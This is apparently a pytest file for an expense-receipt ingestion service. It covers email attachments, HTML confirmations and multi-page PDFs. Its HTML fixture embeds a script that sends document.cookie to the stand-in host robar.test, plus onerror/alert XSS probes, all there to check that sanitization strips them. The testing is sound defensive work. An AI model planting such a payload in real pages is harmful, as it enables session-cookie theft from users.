"""Formatos y canales de los soportes: correo (.eml) con adjuntos, confirmaciones en HTML, PDF de varias páginas
y categorías completas. La lectura usa un doble del modelo: ninguna prueba llama a un servicio externo."""
import base64
import json
import uuid
from email.message import EmailMessage

import pytest
from starlette.testclient import TestClient

from app import api_v1, config, db
from app.servicios import acceso, llm

V1 = "/api/v1"
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64


def _pdf(*paginas: str) -> bytes:
    """Un PDF mínimo con una página por texto; basta para comprobar qué bytes llegan al modelo."""
    objetos = ["<< /Type /Catalog /Pages 2 0 R >>",
               f"<< /Type /Pages /Kids [{' '.join(f'{3 + 2 * i} 0 R' for i in range(len(paginas)))}] /Count {len(paginas)} >>"]
    for i, texto in enumerate(paginas):
        flujo = f"BT /F1 12 Tf 72 720 Td ({texto}) Tj ET"
        objetos += [f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents {4 + 2 * i} 0 R >>",
                    f"<< /Length {len(flujo)} >>\nstream\n{flujo}\nendstream"]
    cuerpo = "".join(f"{n} 0 obj\n{o}\nendobj\n" for n, o in enumerate(objetos, start=1))
    return f"%PDF-1.4\n{cuerpo}%%EOF\n".encode()


@pytest.fixture(autouse=True)
def _sin_rastro():
    """La base es de toda la sesión: los gastos de estas pruebas se borran al final para no gastar el presupuesto del
    viaje compartido ni contar como duplicados en otras pruebas."""
    antes = db.uno("select coalesce(max(id), 0) m from gastos")["m"]
    yield
    for g in db.todos("select id, documento_id from gastos where id>:m", m=antes):
        for sql in ("delete from envios_soporte where gasto_id=:g", "delete from justificaciones where gasto_id=:g",
                    "delete from gastos where id=:g"):
            db.ejecutar(sql, g=g["id"])
        if g["documento_id"]:
            db.ejecutar("delete from documentos where id=:d", d=g["documento_id"])


@pytest.fixture()
def modelo(monkeypatch):
    """Doble del modelo: guarda lo que se le envía y responde la lectura que la prueba fije en `respuesta`."""
    for nombre, valor in (("MODELO_API_URL", "http://modelo.test"), ("MODELO_API_KEY", "clave-de-prueba"),
                          ("MODELO_NOMBRE", "modelo-de-prueba"), ("MODELO_FORMATO", "gemini")):
        monkeypatch.setattr(config, nombre, valor)
    doble = {"enviados": [], "respuesta": {}}

    def generar(contenidos, **opciones):
        doble["enviados"].append({"partes": contenidos[0]["parts"], **opciones})
        lectura = {"comercio": f"Comercio {uuid.uuid4().hex[:8]}", "fecha": "2026-12-10", "categoria": "hotel",
                   "total": 100.0, "moneda": "USD", "confianza": 0.99, "dudas": [], **doble["respuesta"]}
        return {"content": {"parts": [{"text": json.dumps(lectura)}]}, "finishReason": "STOP"}

    monkeypatch.setattr(llm, "generar", generar)
    return doble


def _correo(adjuntos: list[tuple[bytes, str, str]], remitente="Reservas <reservas@hotel-ejemplo.test>",
            asunto="Factura de su estadía", cuerpo="Adjuntamos la factura.") -> bytes:
    msg = EmailMessage()
    msg["From"], msg["To"], msg["Subject"] = remitente, "viajes@empresa-ejemplo.test", asunto
    msg["Date"] = "Thu, 17 Dec 2026 09:00:00 +0000"
    msg.set_content(f"{cuerpo}\nReferencia {uuid.uuid4().hex}")   # cada correo es distinto: nada se reutiliza
    for datos, tipo, nombre in adjuntos:
        principal, secundario = tipo.split("/")
        msg.add_attachment(datos, maintype=principal, subtype=secundario, filename=nombre)
    return bytes(msg)


def _subir_web(c: TestClient, viaje_id: int, nombre: str, contenido: bytes) -> int:
    r = c.post("/gastos/cargar", data={"proyecto_id": 1, "viajero_id": 1, "canal": "web", "viaje_id": viaje_id},
               files={"archivos": (nombre, contenido, "application/octet-stream")}, headers={"X-Envio": "pagina"})
    assert r.status_code == 200 and r.json()["gastos"], r.text
    return r.json()["gastos"][0]


def _enviar_api(c: TestClient, nombre: str, contenido: bytes, viaje_id: int):
    return c.post(f"{V1}/gastos", files={"archivo": (nombre, contenido, "application/octet-stream")},
                  data={"viaje_id": str(viaje_id)}, headers={"X-CSRF-Token": api_v1.token_csrf(c.cookies.get(acceso.COOKIE))})


def _canal(gid: int) -> str:
    return db.uno("select d.canal from gastos g join documentos d on d.id=g.documento_id where g.id=:i", i=gid)["canal"]


def _archivo_enviado(envio: dict) -> tuple[str, bytes] | None:
    for parte in envio["partes"]:
        if "inline_data" in parte:
            return parte["inline_data"]["mime_type"], base64.standard_b64decode(parte["inline_data"]["data"])
    return None


# ---------- pieza 1: canal correo ----------
def test_un_eml_con_pdf_adjunto_lee_el_pdf_y_queda_en_canal_correo(cliente, viaje_aprobado, modelo):
    pdf = _pdf("Factura FT 2026/1187", "TOTAL EUR 375.24")
    correo = _correo([(PNG, "image/png", "logo.png"), (pdf, "application/pdf", "factura.pdf")])
    gid = _subir_web(cliente, viaje_aprobado["id"], "reserva.eml", correo)
    assert _archivo_enviado(modelo["enviados"][-1]) == ("application/pdf", pdf)   # el PDF gana a la imagen que va antes
    assert _canal(gid) == "correo"


def test_un_eml_sin_pdf_lee_la_imagen_antes_que_el_cuerpo(cliente, viaje_aprobado, modelo):
    correo = _correo([(PNG, "image/png", "recibo.png")])
    _subir_web(cliente, viaje_aprobado["id"], "recibo.eml", correo)
    assert _archivo_enviado(modelo["enviados"][-1]) == ("image/png", PNG)


def test_un_adjunto_que_dice_ser_pdf_y_no_lo_es_no_se_envia_como_pdf(cliente, viaje_aprobado, modelo):
    correo = _correo([(b"no soy un pdf", "application/pdf", "falso.pdf")], cuerpo="Total pagado USD 88.00")
    _subir_web(cliente, viaje_aprobado["id"], "falso.eml", correo)
    enviado = modelo["enviados"][-1]
    assert _archivo_enviado(enviado) is None
    assert "Total pagado USD 88.00" in enviado["partes"][0]["text"]


def test_un_eml_por_la_api_queda_en_canal_correo_con_remitente_y_asunto(piloto, viaje_aprobado, modelo):
    correo = _correo([], remitente="Casa do Tejo <reservas@casadotejo.test>", asunto="Fatura da sua estadia")
    r = _enviar_api(piloto, "estadia.eml", correo, viaje_aprobado["id"])
    assert r.status_code == 201, r.text
    g = r.json()
    assert g["canal"] == "correo"
    assert g["correo"] == {"remitente": "Casa do Tejo <reservas@casadotejo.test>", "asunto": "Fatura da sua estadia"}


def test_el_remitente_y_el_asunto_se_ven_en_la_ficha(cliente, viaje_aprobado, modelo):
    correo = _correo([], remitente="Reservas <reservas@aerolinea-ejemplo.test>", asunto="Su tiquete <MIA-LIS>")
    gid = _subir_web(cliente, viaje_aprobado["id"], "tiquete.eml", correo)
    pagina = cliente.get(f"/gastos/{gid}").text
    assert "reservas@aerolinea-ejemplo.test" in pagina
    assert "Su tiquete &lt;MIA-LIS&gt;" in pagina   # el asunto llega escapado, nunca como marcado


def test_un_asunto_con_saltos_de_linea_y_controles_se_guarda_limpio(cliente, viaje_aprobado, modelo):
    correo = _correo([], asunto="Factura\x07 de\tla estadía")
    gid = _subir_web(cliente, viaje_aprobado["id"], "limpio.eml", correo)
    texto = db.uno("select d.texto from gastos g join documentos d on d.id=g.documento_id where g.id=:i", i=gid)["texto"]
    assert json.loads(texto)["asunto"] == "Factura de la estadía"


def test_una_foto_sigue_entrando_por_el_canal_que_la_trajo(cliente, viaje_aprobado, modelo):
    gid = _subir_web(cliente, viaje_aprobado["id"], "foto.png", PNG + uuid.uuid4().bytes)
    assert _canal(gid) == "web"


# ---------- pieza 2: confirmaciones en HTML ----------
HTML = """<!doctype html><html><head><title>Confirmación de reserva</title>
<style>body {{ font-family: sans-serif }} .oculto {{ display: none }}</style>
<script>fetch("https://robar.test/?c=" + document.cookie)</script></head>
<body><h1>Moab Red Rock Lodge</h1><p>Reserva <b>RR-{ref}</b> por <a href="https://reservas.travelnow.test/x">TravelNow</a></p>
<table><tr><td>2 noches</td><td>358.00</td></tr><tr><td>Impuestos</td><td>54.86</td></tr>
<tr><th>Total USD</th><th>412.86</th></tr></table><p>Texto con &lt;script&gt; escrito como texto</p>
<img src="x" onerror="alert(1)"><script type="module">alert("segundo")</script></body></html>"""


def _html(ref: str | None = None) -> bytes:
    return HTML.format(ref=ref or uuid.uuid4().hex[:10]).encode()


def test_tipo_real_acepta_html_solo_si_el_contenido_parece_html():
    from app.servicios import gastos
    assert gastos.tipo_real(_html(), "confirmacion.html") == ("text/html", "html")
    assert gastos.tipo_real(_html(), "CONFIRMACION.HTM") == ("text/html", "html")
    assert gastos.tipo_real(b"solo texto, sin marcado", "nota.html") is None
    assert gastos.tipo_real(_html(), "foto.png") is None   # el contenido HTML no se acepta con otro nombre
    assert gastos.tipo_real(b"\x00\x01<html>", "binario.html") is None


def test_un_html_con_script_no_lo_conserva_ni_en_lo_guardado_ni_en_lo_enviado(cliente, viaje_aprobado, modelo):
    from app.servicios import almacen
    gid = _subir_web(cliente, viaje_aprobado["id"], "confirmacion_hotel.html", _html())
    d = db.uno("select d.* from gastos g join documentos d on d.id=g.documento_id where g.id=:i", i=gid)
    guardado = almacen.leer(d["ruta"]).decode()
    enviado = modelo["enviados"][-1]["partes"][0]["text"]
    for texto in (guardado, enviado):
        assert "Moab Red Rock Lodge" in texto and "412.86" in texto and "TravelNow" in texto
        for rastro in ("fetch(", "document.cookie", "alert(", "font-family", "href", "robar.test", "onerror"):
            assert rastro not in texto, rastro
    assert d["mime"] == "text/plain" and d["ruta"].endswith(".txt") and d["canal"] == "correo"
    assert _archivo_enviado(modelo["enviados"][-1]) is None


def test_el_soporte_html_se_descarga_y_nunca_se_muestra_en_linea(cliente, piloto, viaje_aprobado, modelo):
    gid = _subir_web(cliente, viaje_aprobado["id"], "confirmacion_hotel.html", _html())
    r = cliente.get(f"/gastos/{gid}/soporte")
    assert r.status_code == 200 and r.headers["content-type"].startswith("text/plain")
    assert r.headers["content-disposition"].startswith("attachment") and r.headers["x-content-type-options"] == "nosniff"
    ficha = cliente.get(f"/gastos/{gid}").text
    assert f'<iframe src="/gastos/{gid}/soporte"' not in ficha and f'href="/gastos/{gid}/soporte" download' in ficha

    g = _enviar_api(piloto, "confirmacion.html", _html(), viaje_aprobado["id"]).json()
    r = piloto.get(f"{V1}/documentos/{g['documento_id']}/contenido")
    assert r.status_code == 200 and r.headers["content-type"].startswith("text/plain")
    assert r.headers["content-disposition"].startswith("attachment") and r.headers["x-content-type-options"] == "nosniff"
    assert g["canal"] == "correo"


def test_un_html_sin_texto_se_rechaza_con_un_mensaje_claro(cliente, viaje_aprobado):
    r = cliente.post("/gastos/cargar", data={"proyecto_id": 1, "viajero_id": 1, "canal": "web", "viaje_id": viaje_aprobado["id"]},
                     files={"archivos": ("vacia.html", b"<html><script>alert(1)</script></html>", "text/html")},
                     headers={"X-Envio": "pagina"})
    assert r.status_code == 400 and "texto" in r.json()["errores"][0]


def test_un_correo_con_cuerpo_html_se_reduce_a_texto_antes_de_enviarlo(cliente, viaje_aprobado, modelo):
    msg = EmailMessage()
    msg["From"], msg["Subject"] = "Reservas <reservas@lodge.test>", "Confirmación"
    msg.set_content(_html().decode(), subtype="html")
    _subir_web(cliente, viaje_aprobado["id"], "html.eml", bytes(msg))
    enviado = modelo["enviados"][-1]["partes"][0]["text"]
    assert "412.86" in enviado and "document.cookie" not in enviado and "font-family" not in enviado


def test_la_pagina_de_carga_ofrece_elegir_confirmaciones_html(cliente):
    pagina = cliente.get("/gastos/cargar").text
    assert 'accept="image/*,application/pdf,.eml,.html,.htm"' in pagina and "confirmaciones en HTML" in pagina


# ---------- pieza 3: PDF de varias páginas ----------
def test_un_pdf_de_dos_paginas_llega_entero_al_modelo_con_el_total_de_la_segunda(cliente, viaje_aprobado, modelo):
    pdf = _pdf(f"Tejo Car Hire - contrato {uuid.uuid4().hex[:8]} - continua en la pagina 2", "TOTAL EUR 258.30")
    modelo["respuesta"] = {"total": 258.30, "moneda": "EUR"}
    gid = _subir_web(cliente, viaje_aprobado["id"], "factura_dos_paginas.pdf", pdf)
    enviado = modelo["enviados"][-1]
    assert _archivo_enviado(enviado) == ("application/pdf", pdf)          # sin cortar: las dos páginas
    assert pdf.count(b"/Type /Page ") == 2 and b"TOTAL EUR 258.30" in pdf
    instruccion = enviado["partes"][-1]["text"]
    assert "todas las páginas" in instruccion                            # el modelo sabe que el total puede ir al final
    assert db.uno("select total from gastos where id=:i", i=gid)["total"] == 258.30


def test_un_pdf_adjunto_a_un_correo_tambien_llega_entero(cliente, viaje_aprobado, modelo):
    pdf = _pdf("Factura pagina 1", "Factura pagina 2", f"TOTAL USD 99.10 {uuid.uuid4().hex[:6]}")
    _subir_web(cliente, viaje_aprobado["id"], "tres.eml", _correo([(pdf, "application/pdf", "factura.pdf")]))
    assert _archivo_enviado(modelo["enviados"][-1]) == ("application/pdf", pdf)
